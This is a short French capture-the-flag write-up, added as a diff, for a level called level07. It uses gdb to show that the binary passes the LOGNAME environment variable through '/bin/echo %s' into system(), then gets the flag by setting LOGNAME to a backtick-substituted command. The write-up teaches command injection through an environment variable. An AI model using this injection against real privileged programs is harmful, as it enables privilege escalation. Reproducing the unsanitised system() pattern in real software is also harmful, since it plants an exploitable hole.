@@ -1,0 +1,37 @@
+Un écécutable est présent dans le home, level07.
+
+L'éxécuter retourne "level07"
+
+Nous l'examinons avec gdb:
+
+gdb ./level07
+start
+disass main
+
+Nous voyons à la fin un appel a getenv, puis un appel a asprintf, puis system.
+
+Examinons l'argument de getenv:
+
+x/s 0x8048680 retourne LOGNAME
+
+Le résultat de getenv (dans %eax)
+est ensuite push sur la stack : 0x0804857b <+103>: mov %eax,0x8(%esp)
+
+Ajoutons un breakpoint après le retour de getenv pour voir son contenu:
+
+b *0x0804857b
+continue
+x/s $eax
+
+On voit LEVEL07, qui a cette instruction est mis comme le 3eme argument de asprintf.
+Regardons le 2eme argument de asprinf:
+
+x/s 0x8048688 retourne
+"/bin/echo %s ", et enfin on voit que le retour de asprintf est donné en argument à system.
+
+Il suffit donc de changer la variable environnement LOGNAME, pour qu'elle soit passée a asprint puis a system:
+
+LOGNAME=\`getflag\`
+./level07
+
+et nous avons bien le flag
